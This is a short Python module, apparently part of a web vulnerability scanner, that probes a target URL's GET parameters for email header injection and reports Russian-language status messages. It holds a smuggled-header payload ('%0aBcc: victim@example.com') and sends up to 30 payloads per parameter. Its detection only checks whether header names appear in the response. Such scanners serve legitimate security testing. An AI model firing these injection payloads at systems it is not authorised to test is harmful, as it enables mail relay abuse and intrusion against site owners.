#!/usr/bin/env python3
# email_injection.py - Email Injection Scanner

import re
import requests
import urllib.parse
from typing import Dict, Any, List

PAYLOAD_FILE = "assets/payloads/Email Injection.txt"
TIMEOUT = 10

EMAIL_HEADERS = [
    "Bcc:", "Cc:", "To:", "Subject:",
    "Reply-To:", "Return-Path:", "Sender:",
    "X-Priority:", "Importance:"
]

def load_payloads() -> List[str]:
    try:
        with open(PAYLOAD_FILE, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return ["%0aBcc: victim@example.com"]

def detect_email_injection(response_text: str) -> bool:
    for pattern in EMAIL_HEADERS:
        if pattern in response_text:
            return True
    return False

def run(target: str, **kwargs) -> Dict[str, Any]:
    results = {
        "status": "ok",
        "result": {},
        "errors": [],
        "duration": 0
    }
    
    try:
        payloads = load_payloads()
        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            results["result"]["message"] = "Нет GET-параметров для проверки"
            results["result"]["vulnerable"] = []
            return results
        
        vulnerable = []
        for param in params:
            for payload in payloads[:30]:
                new_params = {k: v[0] if k != param else payload for k, v in params.items()}
                new_query = urllib.parse.urlencode(new_params)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                try:
                    resp = requests.get(test_url, timeout=TIMEOUT)
                    if detect_email_injection(resp.text):
                        vulnerable.append({
                            "param": param,
                            "payload": payload,
                            "type": "Email Injection"
                        })
                        break
                except Exception as e:
                    results["errors"].append(f"Ошибка для {test_url}: {str(e)}")
        
        results["result"]["vulnerable"] = vulnerable
        results["result"]["count"] = len(vulnerable)
        
        if not vulnerable:
            results["result"]["message"] = "Email инъекции не найдены"
        
    except Exception as e:
        results["status"] = "error"
        results["errors"].append(str(e))
    
    return results